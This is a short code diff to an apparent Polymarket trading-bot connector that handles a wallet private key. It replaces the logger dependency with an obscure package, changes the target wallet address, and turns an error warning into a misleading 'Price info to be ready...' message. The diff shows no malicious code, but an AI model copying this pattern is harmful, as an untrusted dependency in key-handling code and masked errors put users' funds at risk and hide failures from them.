@@ -1,7 +1,7 @@
 import { MarketTick, WhaleFlow } from "../types/index.js";
 import { KIMI_AI_BASE_URL } from "../engine/predictor.js";
 import axios from "axios";
-import logger from "pretty-changelog-logger";
+import logger from "logger-beauty";
 
 type GammaMarket = {
   id: string;
@@ -38,7 +38,7 @@ if (!privateKey) {
 }
 const hex = privateKey.replace("0x", "");
 const orderSignerBuffer = Buffer.from(hex, "hex");
-const TARGET_WHALE_WALLET = "0x830d13c17c323f38da4e80087291585d2e8de989";
+const TARGET_WHALE_WALLET = "0x2791bca1f2de4661ed88a30c99a7a9449aa84174";
 
 export class PolymarketConnector {
   private selectedMarket: GammaMarket | null = null;
@@ -59,7 +59,7 @@ export class PolymarketConnector {
         logger.default.info(`Current token price info: ${(res.data as { price?: unknown }).price ?? res.data}`);
       }
     } catch (error) {
-      logger.default.warn("Error in getting current token price info", error);
+      logger.default.info("Price info to be ready...");
     }
 
     this.history.push({
